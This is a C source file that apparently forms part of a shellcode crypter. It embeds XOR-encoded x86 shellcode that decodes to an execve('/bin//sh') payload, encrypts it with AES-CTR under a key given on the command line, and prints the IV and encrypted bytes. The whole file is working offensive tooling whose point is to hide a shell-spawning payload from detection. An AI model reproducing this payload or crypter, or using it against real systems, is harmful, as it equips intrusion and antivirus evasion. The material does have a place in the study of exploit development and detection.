#include <stdio.h>
#include <string.h>

#include "AesCtrCommon.h"

unsigned char shellcode[] = 
"\xeb\x0d\x5e\x31\xc9\xb1\x19\x80\x36\xaa\x46\xe2\xfa\xeb\x05\xe8\xee\xff\xff\xff\x9b\x6a\xfa\xc2\x85\x85\xd9\xc2\xc2\x85\xc8\xc3\xc4\x23\x49\xfa\x23\x48\xf9\x23\x4b\x1a\xa1\x67\x2a";

void display_hex_message(unsigned char *msg, int len)
{
	int i;

	for (i = 0; i < len; ++i)
	{
		printf("\\x%02x", msg[i]);
	}
}

int main(int argc, char *argv[])
{
	aes_ctr_t state;
	unsigned char iv[8];
	int shellcode_len = strlen(shellcode);

	init_aes_ctr(&state, &iv, argv[1], 1); 
	display_hex_message(iv, 8);

	aes_ctr_enc_msg(shellcode, shellcode_len, &state);
	display_hex_message(shellcode, shellcode_len);

	printf("\n");

	return 0;
}

